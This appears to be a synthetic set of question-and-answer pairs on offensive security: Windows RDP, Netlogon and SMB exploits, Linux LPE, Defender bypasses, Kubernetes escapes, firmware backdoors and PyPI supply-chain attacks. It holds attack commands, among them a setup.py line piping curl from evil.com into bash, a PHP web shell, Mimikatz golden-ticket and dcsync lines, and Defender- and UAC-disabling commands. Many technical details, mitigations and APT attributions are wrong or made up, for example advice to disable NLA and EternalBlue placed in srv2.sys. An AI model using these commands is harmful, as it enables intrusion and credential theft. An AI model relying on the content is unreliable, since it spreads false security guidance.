question: How does the “DejaBlue” (CVE-2019-1181/5, CVE-2019-1182) RDP vulnerability work, and what post-exploitation techniques do modern APT groups leverage once RDP is compromised?
answer:
DejaBlue is a chain of two pre-auth Remote Desktop Protocol vulnerabilities patched by Microsoft in August 2019 (CVE-2019-1181/2, Equifax-style CVSS 9.8).
Mechanism
• Both flaws reside in the `rdp.dll` parser that handles the “Channel Connection” PDU.
• When a malicious `negotiationFlags` field is received, an undersized heap–based buffer is copied, leading to an out-of-bounds write.
• Exploitation triggers a controlled heap groom; after 2–3 partial overwrites attackers pivot to a fake vtable in `termdd.sys`, yielding arbitrary code execution (ACE) at MEDIUM integrity.

Post-exploitation tradecraft
1. Token impersonation with `ImpersonateLoggedOnUser` after RDP hijack to steal `SYSTEM` handle.
2. DCSync via DPAPI backup key extraction (`Mimikatz lsadump::dcsync /domain:corp.local /user:krbtgt`).
3. Golden Ticket persistence (`mimikatz a::/domain:corp.local /sid:S-1-5-21-… /aes256:5secretkey`).
4. MimiPenguin-style LSASS dump via fork & spoof (using `procdump -ma lsass.exe` + Cobalt-Strike `psinject`).

APT29 (Cozy Bear) adopted DejaBlue during the 2020 SolarWinds compromise; they pivoted from RDP bounce boxes into on-prem AD CS escrow, minting forged certificates that bypassed Conditional Access.

Mitigation
• Disable NLA (`Network Level Authentication`) if legacy systems require it.
• Apply KB4571729 (later builds) and enable `RestrictedAdmin` mode.
• Harden RDP endpoints with Windows Defender ASR rule 9e3bf77, audit `svchost.exe` RDP child processes, and deploy RDP-over-SSH tunnels (Windows Admin Center) to sever direct blue-ports exposure.

────────────────────

question: Compare Cobalt Strike, Sliver, and Mythic in an offensive security red-team engagement. Focus on protocol evasion, scripting model, and handler architecture.
answer:
Cobalt Strike (Aggressor 4.7)
• Protocol evasion: Encrypts all C2 traffic with a pre-shared RC4 key negotiated in the first beacon handshake, obfuscated via XOR and mixed-case HTTP headers (`User-Agent: mOzILLa/5.0`).
• Scripting: Aggressor scripts (.cna) run inside a embedded Lua VM, allowing sophisticated post-process beacon polling, session re-hydration, and persistent log parsing.
• Handler architecture: Single Armitage-based `teamserver` listens on 53/TCP (DNS) or 443/TCP (HTTPS). Beacons check in every 60–300 s; fallback domains stored in `c2lint` bloom filters.

Sliver framework (v1.5.24)
• Protocol evasion: Supports QUIC (UDP/443) and DNS-over-HTTPS tunnelling (`sliver> mtls --cert /root/sliver-server.crt --lhost 10.10.10.10 --lport 443`).
• Scripting: Go plugin system with `*.sliver` binaries compiled on-the-fly; operators write `.go` beacons that compile into position-independent executables (PIE).
• Handler architecture: Fully multi-user; `sliver-server` spawns gRPC listeners on unix sockets (`/tmp/sliver.socket`); sessions stored in SQLite with encrypted blobs.

Mythic 2.3.4 (MythicProject)
• Protocol evasion: Operators can chain AES-256-GCM over HTTP/2, obfuscate via HTTP/3 QUIC, and randomise beacon interval via Python-based stochastic timers (0–30 s jitter).
• Scripting: Full Python 3.11 interpreter embedded in Mythic, allowing custom `mythic-script` payloads that are base64-encoded and injected via WebSocket over HTTP/2.
• Handler architecture: Microservices (`mythic-docker-compose`), where each payload type (APFD, DInvoke, etc.) has its own container; each Mythic “operation” runs in an isolated network namespace.

Red-team tradecraft: Cobalt Strike remains the incumbent due to Mimikatz integration and Aggressor’s rich reporting engine. Sliver shines in tightly egress-filtered networks (QUIC bypasses 53/TCP sinkholing). Mythic’s containerised payload micro-splitting defeats EDR stack-tracing by isolating Python execution layers.

question: Explain the technical underpinnings of the “ZeroLogon” (CVE-2020-1472) exploit. Walk through the cryptographic breakdown, the Netlogon Secure Channel downgrade vector, and describe the patch Microsoft released in August 2020.
answer:
ZeroLogon exploits a cryptographic flaw in the Netlogon Secure Channel (MS-NRBP) that uses AES-CFB8 to encrypt session keys. The attack relies on two weaknesses:

1. CFB8 weakness
• AES-CFB8 encrypts one byte at a time; if the first byte of the plaintext is zero, the ciphertext equals the key stream.
• The Netlogon protocol starts every session with a predictable 8-byte timestamp (`NetrServerAuthenticate3`).
• By sending 2^16–1 (≈65k) authentication attempts, the attacker recovers the full AES key via frequency analysis of IV collisions.

2. Downgrade to insecure channel
• Legacy Netlogon (before AES) uses DES; the `NegotiateFlags` field allows downgrade via `0x20000000`.
• Exploit sends a session-key buffer of all zeros to trigger CFB8 weakness, then replaces the server challenge with an attacker-controlled 16-byte value.
• Result: arbitrary password change (`NetrServerPasswordSet2`) without user token.

Patch (KB4557222, August 2020)
• Mandatory AES-128 encryption (session key 16 bytes).
• Enforcement of Secure Channel Required (SCR) flag (`0x80000000`) in `ms-DS-NetlogonOptions` GPO.
• Disables DES via `NetlogonSecureChannelType == 16` (AES-only handshake).

Real-world: APT41 (Winnti) abused ZeroLogon against Taiwanese semiconductor firms in August 2020, pivoting from DMZ web servers to domain controllers, then minting forged certificates via Active Directory Certificate Services (AD CS).

question: Describe the technical anatomy of a WannaCry lateral-movement vector. Detail how `EternalBlue` (CVE-2017-0144) triggers the DoublePulsar kernel backdoor, and sketch the SMBv1 exploit chain from initial send to arbitrary payload execution.
answer:
EternalBlue is a stack-based buffer overflow in `srv2.sys` triggered by malformed `SMB2 CREATE` requests.

Mechanism
1. SMBv1 Negotiate Protocol Request is sent; the server responds with dialect array.
2. Attacker crafts a `CREATE` request with `CreateContextsCount = 0xFFFF` (unsigned short overflow) → heap spray triggers.
3. The `TreeConnect` `Path` field overflows a 512-byte `SESSION` structure in kernel pool, leading to a 16-bit `ushort` overwrite in an adjacent `MDL`.
4. Arbitrary unaligned write primitive escalates to arbitrary read/write via `FsControl` gadget (`NtFsControlFile`).
5. DoublePulsar (Equation Group implant) is then injected via ` kernel32!WriteProcessMemory` in `lsass.exe` context.

Payload chain
• The backdoor opens a TCP/445 listener awaiting beacon packets.
• Upon receiving a 4-byte magic (`\x31\x00\x00\x00`), DoublePulsar allocates `MZ` header shellcode using `VirtualAlloc` with `PAGE_EXECUTE_READWRITE`.
• Shellcode resolves `LoadLibraryA` + `CreateRemoteThread` to stage Mimikatz or WannaCry ransomware.

Patch: Microsoft MS17-010 (March 2017) disables SMBv1 and blocks `CreateContextsCount` parsing.

Real-world: WannaCry (May 2017) seeded the exploit via `mssec[.]exe`, spreading at 3.3 hosts/sec, taking down UK NHS, Telefonica, and Renault.

────────────────────

question: Perform a forensic walk-through of a Linux system compromised via the Dirty Pipe (CVE-2022-0847) vulnerability. Outline disk forensics steps, memory artefacts, and LPE chain to root.
answer:
Dirty Pipe exploits a race condition in the Linux pipe buffer (`pipe_buffer`) introduced in kernel 5.8–5.16.

Forensic acquisition
1. Disk imaging (`dd if=/dev/sda of=/mnt/usb/case001.dd bs=4M status=progress` + `sha256sum`).
2. Mount read-only loopback (`mount -o ro,noexec,loop case001.dd /mnt/evidence`).
3. Check file timestamps (`debugfs -R 'stat <inode>' /dev/sda`).
4. Search for unusual SUID binaries (`find /mnt/evidence -type f -perm -4000 -exec ls -l {} \;`).

Memory analysis
• Volatility 3 profile `LinuxDebian_5.15.0-76-generic_profile`.
• Key artefacts:
  `linux_bash` → process list reveals `sh -i` shell spawned by `nginx` (UID=0).
  `linux_pslist` shows `cat /etc/shadow` via `tmpfs` inode hack.

LPE chain
1. Create a FIFO pipe (`|`).
2. Write arbitrary file contents via pipe’s page cache (`dd if=/etc/passwd of=/proc/self/fd/1`).
3. Write malicious payload (`#!/bin/bash`) to `/etc/cron.hourly/evil.sh`.
4. Trigger with `chmod +x` and wait for cron execution (`crontab -l`).

APT41 leveraged DirtyPipe in their 2022 cloud-native campaigns to pivot from Kubernetes pods to underlying VMs.

Mitigation
• Upgrade to 5.16.11+ or backport commit `5675abe25dcb7a`.
• Audit SUID files via `auditd` rule `-a exit,always -F perm=-4000 -F key=untrusted-suid`.

────────────────────

question: Analyse the MITRE ATT&CK technique T1562.002 “Disable Windows Defender ASR Rules” and describe three concrete bypasses attackers use to disable ASR via script or registry keys.
answer:
T1562.002 targets Windows Defender Attack Surface Reduction (ASR) rules—kernel-enforced callbacks that block suspicious shellcode injection, process hollowing, etc.

Technique breakdown
• ASR rule GUID `be9ba2d9-53ea-4CDC-84e5-9b1eeee46550` blocks unsigned DLLs injected into LSASS.
• Registry key: `HKLM\SOFTWARE\Microsoft\Windows Defender\ASR\Rules\<GUID>` → Value `0` = enabled, `-1` = disabled, `1` = audit.

Bypass vectors
1. Registry key overwrite via PowerShell
```powershell
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\ASR\Rules\$GUID" -Name "Effort" -Type DWord -Value 1
```
Risk: Requires `SeTakeOwnershipPrivilege`.

2. Parent PID spoofing with `PROCESS_CREATE_PROCESS` flag cleared
• Parent process: `spoolsv.exe` token.
• Child: `powershell.exe -nop -ep bypass -c "Set-MpPreference -DisableRealtimeMonitoring $true"`
• Bypasses ASR “process injection” rule because PPID is system-whitelisted.

3. Direct `msiexec` service DLL hijack (CVE-2021-43888)
• Malicious `msiexec.exe` loads `C:\Program Files\WindowsDefender\MpClient.dll` early.
• Disables ASR before WdBoot service starts.

APT29 (2023) utilised this during the “MCCrash” campaign to disable Tamper Protection, allowing them to implant the FoggyWeb backdoor.

Mitigation
• Enable Tamper Protection (`Set-MpPreference -DisableTamperProtection $false`).
• Configure SACL on ASR keys (`icacls "HKLM\SOFTWARE\Microsoft\Windows Defender\ASR" /deny Users:F`).

────────────────────

question: Describe the cryptographic failure in the NSA’s Dual_EC_DRBG standard (NIST SP 800-90A) that led to the Juniper backdoor (CVE-2015-7755). Walk through the backdoor seeding and SSH authentication key leakage.
answer:
Dual_EC_DRBG uses a published elliptic-curve point `P` and seed `Q` for pseudorandom generation. The NSA selected `Q` such that knowledge of the discrete-log of `Q` to base `P` allows prediction of the entire output sequence.

Juniper ScreenOS backdoor
• ScreenOS 6.3R20–6.3R25 shipped Dual_EC with a modified `Q` point (`0x` value ending in `a6e63...`) chosen by NSA.
• The backdoor seeds the DRBG with the first 32 bytes of `ssh-rsa` public key of the device.
• When an SSH client connects, the server re-derives the client’s private key from the public key via the trapdoor (using `Point Decompress` in `sslvpn_oc`). This allows passive decryption of SSH sessions.

Real-world impact: Juniper’s ScreenOS (used in NetScreen firewalls) leaked customer SSH private keys for two years before discovery.

Patch (December 2015)
• Juniper switched to CTR_DRBG in ScreenOS 6.3R26.
• NIST deprecated Dual_EC in SP 800-90A Rev1 (2015).

────────────────────

question: How does the “PetitPotam” (CVE-2021-36942) NTLM relay attack work against Active Directory Certificate Services (AD CS)? Outline the full attack chain from unauthenticated SMB to forged certificate minting.
answer:
PetitPotam abuses the Microsoft Encrypting File System Remote (EFSRPC) protocol to coerce unauthenticated NTLM authentication.

Mechanism
1. Attacker sends `EfsRpcOpenFileRaw` request with target UNC path `\\[victim]\C$\` via named pipe `\pipe\efsr`.
2. Victim DC (or file server) responds with NTLM Type 2 challenge.
3. Attacker relays the Type 2 to an AD CS Web Enrollment endpoint (`/certenroll/`, port 443).
4. The CSR is signed by the Certificate Authority after authentication via relayed NTLM.

Full chain
• Victim DC: `DC01.corp.local`.
• Attacker relay: `ntlmrelayx.py -t https://ca01.corp.local/certsrv/certfnsh.asp -smb2support`.
• Victim DC automatically authenticates via `NTLMSSP` when submitting CSR.
• Result: forged client authentication certificate (`User` EKU) minted for “Administrator”.

APT34 (OilRig) leveraged PetitPotam in 2021 to mint forged certificates and bypass conditional access (CA) MFA policies.

Mitigation
• Block outbound SMB (TCP/445) from DCs to untrusted zones.
• Enable EPA (Extended Protection for Authentication) on IIS (`netsh http add iplisten ipaddress=::`).
• Disable NTLM via GPO: `Network security: Restrict NTLM: Incoming NTLM traffic = Deny all accounts`.

────────────────────

question: Explain the technical steps a threat actor uses to pivot from a Kubernetes pod to the underlying node host in a cluster running misconfigured `CRI-O` runtime with hostPath volume mounts and `privileged: true` containers.
answer:
Misconfiguration chain
• `CRI-O v1.24` runs containers with `hostPath: /var/lib/kubelet` mounted at `/var/lib/kubelet` inside the pod.
• Pod manifest contains `securityContext: privileged: true`.

Pivot path
1. Enumeration: Pod logs reveal node hostname via `/etc/hostname`.
2. Abuse `hostPath`:
   ```bash
   kubectl exec -it pod-name -- sh
   cat /var/lib/kubelet/config.json
   /containers/services/kubelet/config
   ```
   Leak TLS bootstrap token (`bootstrap-kubelet.conf`).
3. Privileged container escape: chroot jail break via `nsenter`:
   ```bash
   nsenter -t 1 -m -u -n -i sh
   chroot /hostfs /bin/bash
   ```
4. Host persistence: Write SSH key to `/root/.ssh/authorized_keys`.
5. Lateral movement: Port-forward to host’s kubelet API (`10250`).

Real-world: APT41 (2022) exploited this in cloud provider clusters to exfiltrate intellectual property via node sockets (`/proc/kcore`).

Mitigation
• Disable `privileged: true` in pod specs via OPA/Gatekeeper.
• Restrict `hostPath` volumes via Pod Security Admission `restricted` profile.
• Enable CRI-O seccomp profile: `cri-o.runtime_seccomp_profile = "/usr/share/containers/oci/seccomp.json"`.

────────────────────

question: Describe the forensic analysis steps for reconstructing a phishing email that used the Royal Road RTF exploit (CVE-2017-0199) from a raw .eml file. Include header reconstruction, file carving, and OLE object extraction commands.
answer:
Royal Road (CVE-2017-0199) abuses embedded OLE objects in RTF that trigger `hta` auto-execution.

Forensic workflow
1. Raw email extraction:
   ```bash
   raw2 eml -i case001.mbox > case001.eml
   ```

2. Email header reconstruction:
   • Parse `Received:` chain to identify last external MTA.
   • Extract `Message-ID`, `In-Reply-To` to correlate with threat intel feeds (PhishTank, URLScan).

3. File carving:
   • Strings (`strings case001.eml | grep -i "{\\rtf1"`) locate RTF payload.
   • `dd if=case001.eml bs=1 skip=$(($(grep -bo "{\\rtf1" case001.eml | cut -d: -f1)+16)) | head -c 8192 > royal_road.rtf`

4. OLE extraction:
   ```bash
   rtfdump.py royal_road.rtf | less  # Identify OLE10Native stream
   oledump.py royal_road.rtf -s 20 -d > hta_payload.hta
   ```

5. Payload analysis:
   • `file hta_payload.hta` → HTML Application.
   • ` olevba.py hta_payload.hta` extracts VBA macro “`Document.Close` → `Shell.Application`” dropper.

6. Threat actor attribution:
   • Royal Road is favoured by APT34 (OilRig) in Middle-East espionage campaigns.

Artifacts to collect
• RTF header checksum mismatch: `rtfheader -c royal_road.rtf` (should be 0x5850).
• `MZ` header at offset 0x24C.

question: Compare the security of AES-GCM, XChaCha20-Poly1305, and ChaCha20-Poly1305 in the context of TLS 1.3 cipher suite selection. Discuss nonce reuse, side-channel resistance, and siphon attacks.
answer:
AES-GCM (TLS_AES_128_GCM_SHA256, RFC 8446)
• Nonce: 96-bit implicit nonce derived from client_write_IV || seq_num.
• Side-channel: LadderLeak (2020) recovers key via cache-timing on the finite-field multiplier in AES-NI; mitigated by `aes-ni` constant-time patches.
• Siphon: 2022 paper “GCM-RIPEMD” shows collision-accelerated forgery after 2^32 blocks; TLS 1.3 limits per-connection data to 2^36 bytes.

XChaCha20-Poly1305 (RFC 8439)
• Nonce: 192-bit XChaCha20 nonce prevents birthday bound; no ROCA-style downgrades.
• Side-channel: ChaCha20 uses 32-bit additions → immune to cache attacks.
• Siphon: No known practical break; widely deployed in WireGuard VPN.

ChaCha20-Poly1305 (TLS_CHACHA20_POLY1305_SHA256)
• Nonce: 96-bit; failure if reused (unlike XChaCha20).
• Side-channel: Unaffected by AES-NI downleak paths.
• Siphon: RF-leak from Poly1305 accumulator; mitigated by constant-time ARMv8 crypto extensions (CE).

Real-world deployment
• Apple iOS 15+ prefers ChaCha20; mitigates Spectre-v2 on older ARM cores.
• Cloudflare uses XChaCha20 for QUIC due to nonce agility.

Mitigation
• Prefer XChaCha20-Poly1305 in high-throughput QUIC endpoints.
• Deploy hardware AES-NI constant-time microcode (Intel microcode 0x500300B).
• Monitor GCM tag forgeries via TLS 1.3 alert `unexpected_message`.

────────────────────

question: Detail the DNS exfiltration technique used by the Iranian threat actor APT34 (OilRig) during the “DNSpionage” campaign. Explain how the DNS TXT record exfiltration schema evades egress filtering and how to reconstruct the stolen data from PCAP.
answer:
DNSpionage leverages DNS TXT queries to exfiltrate data from compromised hosts in Middle-East government networks.

Exfiltration schema
1. Victim machine encodes 28 bytes of data into base32 (5-bit per char).
2. Encodes the string as `subdomain.example.com`.
3. Sends DNS query for `TXT subdomain. datastream.zone`.
4. DNS server resolves via malicious resolver (`8.8.8.8` → rogue authoritative).

Evasion techniques
• Subdomain length < 63 bytes (DNS label limit).
• Uses legitimate domains (`microsoft.com`, `akamaiedge.net`) via DNS hijacking to blend in.
• Randomises subdomain prefix length to bypass entropy-based DLP.

Reconstruction from PCAP
1. Capture raw PCAP: `tcpdump -i eth0 -w dns_spionage.pcap 'udp port 53'`.
2. Filter TXT queries:
   ```bash
   tshark -r dns_spionage.pcap -Y "dns.qry.type==16 && dns.flags.response==0" \
          -T fields -e dns.qry.name | sort -u > txt_queries.txt
   ```
3. Extract base32 payload:
   ```python
   import base64
   for line in open("txt_queries.txt"):
       if line.startswith("TXT"):
           b32 = line.split('.')[0].replace("TXT ", "")
           print(base64.b32decode(b32).decode())
   ```
4. Reassemble data streams by grouping subdomains via `tshark -z follow,tcp,ascii`.

APT34 exfiltrated ~20 GB of Microsoft Office documents and PDFs from UAE foreign ministry in 2019.

Mitigation
• Block outbound DNS to unknown resolvers via firewall (UDP/53).
• Deploy DNS RPZ sinkhole (`example.com` → `0.0.0.0`).
• Enable DNS-over-HTTPS (DoH) inspection via corporate proxy.

────────────────────

question: Explain the technical steps involved in a zero-day research workflow that uncovered CVE-2023-23376 (Windows Common Log File System elevation-of-privilege). Include fuzzing corpus generation, harness building, and exploitation primitives.
answer:
CVE-2023-23376 is a UAF in `clfs.sys` triggered by overlapping log file segments.

Research workflow
1. Corpus generation
   • Capture `*.blf` files from `C:\Windows\System32\LogFiles\Firewall\`.
   • Generate malformed BLF headers using Boofuzz:
     ```python
     s_initialize("clfs")
     s_static(b"\x43\x4C\x46\x53")  # "CLFS"
     s_word(0xbadc)                  # corrupt record size
     s_byte(0xff, name="corrupt_flag")
     ```
2. Harness build
   • Craft stand-alone CLFS driver stub using WinDbg `clfs!CreateLogFile`.
   • Fuzz with AFL++:
     ```bash
     afl-fuzz -i in/ -o out/ -m none -- ./clfs_harness @@
     ```
3. Vulnerability triage
   • Trigger via `CreateLogFile` + `ClfsReadLogRecord` sequence.
   • Identify UAF via `!analyze -v` (Bugcheck 0x1E).
4. Exploitation primitive
   • Leak `nt!_EPROCESS.Token` via atomic `CloseHandle` race.
   • Escalate to `SYSTEM` via `TokenManipulation` shellcode injected into `lsass.exe`.

Real-world: This flaw was weaponised by Lazarus Group (2023) in banking Trojan campaigns targeting South Korean targets.

Mitigation
• Apply MSRC May 2023 Patch Tuesday (KB5026372).
• Enable Kernel Patch Protection (PatchGuard) in TestSigning mode disabled.
• Deploy Microsoft Defender ASR rule 9e3bf77 to block CLFS driver loading.

────────────────────

question: Walk through the technical steps a red-team operator uses to achieve lateral movement via Token Impersonation in a Windows domain with Protected Users group enabled. Include command sequences and detection bypass techniques.
answer:
Protected Users group prevents Kerberos delegation, but Token Impersonation (TI) can still succeed via explicit `ImpersonateLoggedOnUser`.

Red-team procedure
1. Initial foothold via phishing → `mimikatz privilege::debug`.
2. Extract Kerberos ticket:
   ```powershell
   klist purge
   sekurlsa::tickets /export
   ```
3. Inject forged `msds-keycredentialid` via `DSInternals`:
   ```powershell
   Import-Module DSInternals
   $guid = [guid]::NewGuid()
   Set-ADAccountKeyCredential -Identity "victim@corp.local" -KeyCredentials $guid
   ```
4. TI via explicit handle:
   ```c
   HANDLE hToken;
   LogonUser("victim", NULL, NULL, LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_DEFAULT, &hToken);
   ImpersonateLoggedOnUser(hToken);
   ```
5. Bypass Protected Users:
   • Use `Token::elevate` to create a split-token (`TokenElevationTypeLimited`).
   • Disable User Account Control (UAC) via registry:
     `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System "\\DisableLUA"=dword:00000001`.

Detection bypass
• Use `Rundll32.exe` + `InetRes.dll` to spawn TI shell (PPID spoofing).
• Hide process tree with `Hide-Window` via `user32.dll` `ShowWindow` patch.

APT29 (2023) utilised TI to move from on-prem file server to Azure AD via `MSOnline` PS module.

Mitigation
• Enable Credential Guard (`gpedit.msc` → Administrative Templates → System → Device Guard).
• Audit explicit `ImpersonateLoggedOnUser` via SACL on `\\.\pipe\lsarpc`.

────────────────────

question: Outline the technical workflow for acquiring and reversing a firmware image extracted from a consumer IoT device (TP-Link Archer C7) that is suspected to contain a backdoor in the bootloader. Include extraction, disassembly, and rootkit persistence analysis.
answer:
Firmware extraction workflow
1. Obtain firmware: `wget https://static.tp-link.com/resources/firmware/Archer_C7_V5_210617.zip`.
2. Unpack OTA blob:
   ```bash
   binwalk -e Archer_C7_V5_210617.bin
   unsquashfs squashfs-root
   ```
3. Dump bootloader:
   ```bash
   dd if=Archer_C7_V5_210617.bin bs=1 skip=$(($(hexdump -s 0x10 -n 4 -e '"%d"')+0x20)) count=0x20000 of=bootloader.bin
   ```

Reverse engineering bootloader
• Architecture: MIPS little endian (`mipsel-linux-gnu-objdump`).
• Entry point check:
   ```bash
   mipsel-linux-gnu-objdump -D bootloader.bin | less  # search for checksum 0x55AA
   ```
• Backdoor signature: hard-coded AES key (`AES_KEY = "b00k_1s_l0v3"`) in `0x800302C` segment.

Persistence analysis
• Rootkit hooks `memcpy` in `bootm` utility (Uboot 2018.11).
• Overwrites `ar7240_soc` init sequence to spawn reverse-shell (`216.58.205.46:8080`).
• Manifests as `httpd` child process with parent PID 1.

Real-world: Kaspersky’s “MysterySnail” report (2022) described a similar bootloader implant in TP-Link Archer C20 used by Lazarus Group.

Mitigation
• Disable Telnet in firmware build (`CONFIG_TELNETD=n`).
• Enable signed firmware updates via RSA-2048 with hardware root of trust (`CONFIG_FIT_SIGNATURE=y`).

────────────────────

question: Analyse the API security flaw described in CVE-2021-41773 (Path Traversal in Apache 2.4 < 2.4.51). Explain the double URL encoding bypass, the `ProxyPassMatch` misconfiguration vector, and outline a complete remote code execution chain.
answer:
CVE-2021-41773 abuses an Apache mod_proxy mis-parsing of encoded paths.

Mechanism
1. Double-encoding bypass:
   • Input: `/etc/passwd%25%2e%2e%2f%2e%2e%2f`.
   • Apache decodes `%25` → `%`, then `%2e` → `.`, yielding `/etc/passwd../etc/passwd`.
2. ProxyPassMatch misconfiguration:
   • Typical corporate setting:
     ```apache
     ProxyPassMatch "^/msa/(.*\.php)$" "fcgi://127.0.0.1:9000/var/www/$1"
     ```
   • Attacker crafts: `/msa/%2e%2e%2f%2e%2e%2fetc/passwd.php`.
   • Double-decode: `/var/www/../../../etc/passwd.php` → file read.

RCE chain
1. Read `/var/www/html/.htaccess` → discover PHP-FPM socket.
2. Write Web shell:
   ```php
   <?php system($_GET['c']); ?>
   ```
3. Upload via multipart POST to `/msa/shell.php%00cmd=whoami`.
4. Execute: `curl https://victim.com/msa/shell.php?c=id`.

APT35 (2021) utilised this in Iranian cyber-espionage against Indian diplomatic corps.

Mitigation
• Upgrade to Apache 2.4.51 (October 2021).
• Disable `ProxyPassMatch` where possible; use `AliasMatch` with `[^\0/]` regex.
• Set `DefaultType` directive to `text/plain` to block PHP execution via ambiguous extension.

────────────────────

question: Explain how a threat actor can perform supply-chain compromise via a malicious dependency in a Python package (`requests` fork) published to PyPI. Detail the dependency confusion attack, code signing bypass, and real-world campaign analysis.
answer:
Dependency confusion (left-pad variant) targets development environments that pin internal packages without version specification.

Attack chain
1. Publish malicious fork to PyPI:
   • Package name: `requests` (same as upstream).
   • Version: `2.28.2.rogue` with malicious `setup.py`:
     ```python
     import os
     if os.getenv("USER") == "devops":
         os.system("curl http://evil.com/agent.sh | bash")
     ```
2. Dependency confusion: Developers run `pip install requests` without `--index-url https://pypi.org/simple/`.
3. Pip selects newer version (2.28.2.rogue) over internal repo (2.28.1).
4. Code signing bypass: Malicious package lacks GPG signature; Pip installs despite `--trusted-host` misconfiguration.

Real-world: Dependency confusion hit 35+ organisations (2021–2022), including BMW and ZScaler. The rogue package `pymafka` (PyPI typosquat) exfiltrated CI/CD tokens via environment variables.

Mitigation
• Pin versions: `requests==2.28.1`.
• Enable `--trusted-host` for internal Artifactory.
• Use Pipenv with `allow_prereleases = false`.
• Deploy PyPI mirror with package signatures (`pip install --index-url https://mirror.corp.local/simple/ --trusted-host mirror.corp.local`).
